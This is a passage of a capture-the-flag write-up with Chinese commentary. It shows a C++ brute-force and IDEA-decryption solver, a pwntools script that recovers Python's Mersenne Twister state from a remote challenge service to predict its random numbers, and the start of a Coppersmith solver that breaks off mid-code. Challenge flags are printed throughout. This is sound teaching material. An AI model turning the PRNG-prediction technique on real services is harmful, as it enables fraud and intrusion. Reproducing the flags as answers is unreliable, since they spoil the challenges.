number\">0x4DB26158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D080DF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17B7BE43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD70DD2EF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9B9DF6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3903B3C2</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xA3BC0075</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63066CD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFED41B77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E6E77DB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4D1C46C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x646BA8C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4ADFA541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A65C9ED</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x10DA7A5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD06016F6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF00F9345</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30B5FFE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA0A4C5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6AB020F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44042D73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84BE41DF</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1E01F268</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDEBB9EC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4369E96A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83D385C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x196C3671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9D65ADD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF762575C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37D83BF0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xAD678847</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6DDDE4EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76DC4190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6662D3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2CD99E8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC63F227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2D7FFA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x026D930A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x98D220BD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58684C11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5BA3BBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05005713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9FBFE4A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F058808</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71B18589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB10BE925</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x2BB45A92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB0E363E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB61B38D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0BDBDF21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91646C96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51DE003A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F6A0DBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBFD06117</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x256FD2A0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5D5BE0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7807C9A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8BDA50E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x220216B9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2B87A15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC0C7794</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0CB61B38</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x9609A88F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56B3C423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6D6A3E9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x166CCF45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8CD37CF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C69105E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62DD1DDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2677173</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x38D8C2C4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF862AE68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65B0D9C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA50AB56A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3FB506DD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF0F6A71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1BB67F0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11010B5C</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x8BBEB8EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B04D447</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B6B51F4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xABD13D58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x316E8EEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1D4E243</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF60EFC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1FDA836E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x856530D9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45DF5C75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD80D2BDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18B74777</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8208F4C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42B2986C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C0695ED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xACBCF941</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x36034AF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCC00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">uint32_t</span> enc1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x46A95BAD</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1CAC84B6</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xA67CB2B2</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x32188937</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x4872D39F</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xF2A2E59B</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x011B94D2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 爆破前7字节</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> <span class=\"token number\">28</span><span class=\"token punctuation\">;</span> c <span class=\"token operator\">&lt;</span> <span class=\"token number\">132</span><span class=\"token punctuation\">;</span> c<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token punctuation\">)</span>c <span class=\"token operator\">^</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xB0E0E879</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> enc1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 后16字节进行IDEA解密</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc2<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// unsigned int key[4] = &#123;</span>\n    <span class=\"token comment\">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x6C98B242</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78563412</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E6A6D0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEFCDAB89</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    code keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span>\n        keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> cipher1<span class=\"token punctuation\">,</span> cipher2<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token generic-function\"><span class=\"token function\">i</span> <span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            cipher1<span class=\"token punctuation\">[</span><span class=\"token number\">63</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>enc2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span></span></span> <span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            cipher2<span class=\"token punctuation\">[</span><span class=\"token number\">63</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>enc2<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">subkeys_get</span><span class=\"token punctuation\">(</span>keys_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">inv_subkeys_get</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> plain1 <span class=\"token operator\">=</span> <span class=\"token function\">dencrypt</span><span class=\"token punctuation\">(</span>cipher1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> plain2 <span class=\"token operator\">=</span> <span class=\"token function\">dencrypt</span><span class=\"token punctuation\">(</span>cipher2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">uint64_t</span> plain1_val <span class=\"token operator\">=</span> plain1<span class=\"token punctuation\">.</span><span class=\"token function\">to_ullong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> plain2_val <span class=\"token operator\">=</span> plain2<span class=\"token punctuation\">.</span><span class=\"token function\">to_ullong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">uint8_t</span> dec2<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dec2<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>plain2_val<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dec2 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>plain1_val<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>dec2<span class=\"token punctuation\">,</span> dec2 <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.16s\\n\"</span><span class=\"token punctuation\">,</span> dec2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>flag{moshui_build_this_block}</p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"Division\"><a href=\"#Division\" class=\"headerlink\" title=\"Division\"></a>Division</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    choose <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">': >>> '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> choose <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            denominator <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'input the denominator: >>> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'INPUT NUMBERS'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n        nominator <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> denominator <span class=\"token operator\">==</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NO YOU DONT'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>nominator<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">//</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>denominator<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>nominator<span class=\"token operator\">//</span>denominator<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n</code></pre>\n\n<p>题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> randcrack <span class=\"token keyword\">import</span> RandCrack\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\n\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nsh<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.217.82\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28739</span> <span class=\"token punctuation\">)</span>\ndata<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>> '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'tor: >>> '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n    line<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\nRC <span class=\"token operator\">=</span> RandCrack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n    RC<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'er: >>>'</span><span class=\"token punctuation\">)</span>\nrand1 <span class=\"token operator\">=</span> RC<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">11000</span><span class=\"token punctuation\">)</span>\nrand2 <span class=\"token operator\">=</span> RC<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span>\ncorrect_ans <span class=\"token operator\">=</span> rand1 <span class=\"token operator\">//</span> rand2\n\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>correct_ans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </code></pre>\n\n<blockquote>\n<p>XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}</p>\n</blockquote>\n<h3 id=\"Complex-signin\"><a href=\"#Complex-signin\" class=\"headerlink\" title=\"Complex_signin\"></a>Complex_signin</h3><p>题目构造了复数对象，混淆了m的实部和虚部的低128位,已知</p>\n<p><img src=\"/images/cry1-1744626745339-67.png\" alt=\"cry1\" loading=\"lazy\"></p>\n<p>二元copper解低位即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> ChaCha20\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> itertools\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">small_roots</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> bounds<span class=\"token punctuation\">,</span> m<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> d<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> d<span class=\"token punctuation\">:</span>\n        d <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>degree<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    R <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>base_ring<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    N <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>cardinality<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    f <span class=\"token operator\">/=</span> f<span class=\"token punctuation\">.</span>coefficients<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    f <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span>\n\n    G <span class=\"token operator\">=</span> Sequence<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        base <span class=\"token operator\">=</span> N <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>m <span class=\"token operator\">-</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> f <span class=\"token operator\">^</span> i\n      